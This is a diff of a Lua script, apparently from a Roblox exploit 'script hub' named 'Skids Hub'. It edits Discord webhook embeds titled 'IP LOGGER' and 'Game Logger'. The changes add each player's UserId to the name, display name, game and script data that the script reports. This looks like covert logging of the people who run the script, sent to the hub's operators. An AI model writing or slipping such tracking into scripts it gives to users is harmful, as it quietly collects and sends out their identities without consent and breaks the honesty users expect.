@@ -29,7 +29,7 @@ do
                         },
                         title='Skids Hub **IP LOGGER**',
                         url='https://discord.gg/q8FspVseAU',
-                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, scriptName),
+                        description = string.format('@%s**(%s)[%d]** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, game.Players.LocalPlayer.UserId ,scriptName),
                         color = 0,
                         fields  = {
                             {
@@ -120,6 +120,7 @@ do
             local gameThumb = string.format('https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png',game.PlaceId)
 
             local webhookJson = {
+                content = string.format('**@%s(%d)** __fired__ **%s**', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId ,scriptName),
                 embeds = {
                     {
                         author={
@@ -128,7 +129,6 @@ do
                             icon_url='https://sweetiefoxislife.000webhostapp.com/media/skids_HUB.png'
                         },
                         title='Skids Hub **Game Logger**',
-                        content = string.format('**@%s** __fired__ **%s**', game.Players.LocalPlayer.Name, scriptName),
                         color = 0x080808,
                         url='https://discord.gg/q8FspVseAU',
                         description = string.format('@%s**(%s)** is playing [game](https://www.roblox.com/games/%d)', game.Players.LocalPlayer.Name, game.Players.LocalPlayer.DisplayName,game.PlaceId),
